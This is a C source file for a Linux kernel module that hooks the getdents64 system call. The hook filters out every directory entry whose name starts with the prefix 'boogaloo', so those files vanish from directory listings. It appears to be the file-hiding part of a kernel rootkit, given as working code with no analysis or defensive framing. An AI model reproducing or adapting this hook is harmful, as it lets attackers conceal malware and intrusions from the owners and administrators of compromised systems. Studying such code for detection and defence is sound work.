#include "getdents.h"

#include <linux/dirent.h>

// Any entry with this prefix will be hidden
#define PREFIX "boogaloo"

asmlinkage int (*getdents64_orig)(struct pt_regs *regs);

asmlinkage int getdents64_hook(struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent_user;
    struct linux_dirent64 *dirent_kern;
    int rv;

    unsigned long offset = 0;
    struct linux_dirent64 *currentdir, *prevdir = NULL;

    dirent_user = (struct linux_dirent64 *)regs->si;

    if ((rv = getdents64_orig(regs)) <= 0)
        return rv;

    if ((dirent_kern = kmalloc(rv, GFP_KERNEL)) == NULL) {
        printk(KERN_WARNING "kmalloc failed");
        return rv;
    }

    if (copy_from_user(dirent_kern, dirent_user, rv) > 0) {
        printk(KERN_WARNING "copy_from_user failed");
        kfree(dirent_kern);
        return rv;
    }

    while (offset < rv) {
        currentdir = (void *)dirent_kern + offset;

        if (memcmp(PREFIX, currentdir->d_name, strlen(PREFIX)) == 0) {
            printk(KERN_INFO "found %s", currentdir->d_name);

            if (currentdir == dirent_kern) {
                rv -= currentdir->d_reclen;
                memmove(currentdir, (void *)currentdir + currentdir->d_reclen, rv);
                continue;
            }

            prevdir->d_reclen += currentdir->d_reclen;
        } else {
            prevdir = currentdir;
        }

        offset += currentdir->d_reclen;
    }
    
    if (copy_to_user(dirent_user, dirent_kern, rv) > 0)
        printk(KERN_WARNING "copy_to_user failed");

    kfree(dirent_kern);
    return rv;
}
